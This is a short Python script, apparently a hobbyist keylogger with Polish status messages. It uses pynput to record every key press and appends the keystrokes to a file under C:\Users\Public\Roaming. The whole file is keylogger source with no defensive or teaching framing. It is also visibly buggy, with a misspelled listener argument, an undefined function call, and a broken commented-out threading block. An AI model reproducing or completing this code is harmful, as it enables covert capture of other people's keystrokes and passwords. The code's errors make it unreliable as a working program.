
import os
from pynput.keyboard import Key, Listener

keys = []
count = 0
class LisAndWrite ():
    def __init__(self):
        #self.runKey()
        pass
    def on_press(self, key):
        global keys, count
        keys.append (key)
        count += 1
        print ("{0} pressed".format (key))

        if count >= 10:
            count = 0
            self.write_file (str (keys))
            keys = []

    def write_file(self, keys):

        with open (r"C:\Users\Public\Roaming\key.text", "a") as f:
            cwd = os.getcwd ()
            for key in keys:
                k = str (key).replace ("'", "")
                if k.find ("space") > 0:
                    f.write ('\n')
                    print("zapisano do pliku")
                elif k.find ("Key") == -1:
                    f.write (k)
                    print ("zapisano do pliku")

    def on_release(self, key):
        if key == Key.esc:
            return False

    def runKey(self):
        with Listener (on_press=self.on_press, n_release=self.on_release) as listener:
            listener.join ()
            listener.start ()
            try:
                with_statements ()
            finally:
                listener.stop ()


#if __name__ == '__main__':
#    keylogger = LisAndWrite ()
 #   th2 = threading.Thread (target=LisAndWrite.runKey(self=keylogger))
  #  th2.start ()
